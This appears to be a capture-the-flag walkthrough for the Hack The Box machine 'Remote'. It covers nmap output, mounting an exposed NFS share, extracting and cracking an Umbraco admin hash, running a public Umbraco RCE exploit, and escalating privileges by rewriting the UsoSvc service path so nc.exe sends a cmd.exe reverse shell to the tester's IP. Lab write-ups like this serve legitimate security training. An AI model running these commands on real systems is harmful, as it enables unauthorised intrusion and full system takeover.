# Remote walkthrough

Machine ip:

Nmap results: 10.10.10.180

```
# Nmap 7.80 scan initiated Thu Apr  9 16:02:43 2020 as: nmap -o nmap.txt -sS -sV -sC -p 0-8000 -Pn 10.10.10.180
Nmap scan report for 10.10.10.180
Host is up (0.051s latency).
Not shown: 7993 closed ports
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|_  SYST: Windows_NT
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  mountd        1-3 (RPC #100005)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

## User

Browsing the website at port 80 led us to a deathpoint because we need some credentials.
focusing on port 2049 and on this article https://resources.infosecinstitute.com/exploiting-nfs-share/ i managed to mount the remote folder
in my machine with the command:
```
showmount -e 10.10.10.180
mkdir /root/Desktop/test
mount -t nfs 10.10.10.180:/site_backup /root/Desktop/test
```

Inside the App_Data folder, there is Umbraco database, sdf format, and in the top of the file (head
command), we find the hash of a user: ``` head Umbraco.sdf```. We need to crack it, it's encoded with sha1.

The credentials (admin@htb.local / baconandcheese) bring us inside the Admin panel on the website and we see that the version running could be exploited
https://github.com/noraj/Umbraco-RCE and running ```python3 exploit.py -u admin@htb.local -p baconandcheese -c powershell.exe -a '-NoProfile -Command cd "./../../../Users/Classic .NET AppPool"; dir' -i http://10.10.10.180``` i can get a shell and i can get the user flag.

## Root

To gain access as Administrator, we run winpeas.exe, a tool that allows automatic enumeration during the
privilege escalation phase. The message appears in red:

```
LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
UsoSvc: AllAccess, Start

```

Payloadallthethins helped me exploiting UsoSvc

```
sc.exe config UsoSvc binPath="cmd.exe /c C:\Users\Public\nc.exe 10.10.15.14 5555 -e cmd.exe"
sc.exe start UsoSvc
```

And listening with nc on my loal machine i could get a shell with root privileges. Root flag captured. 
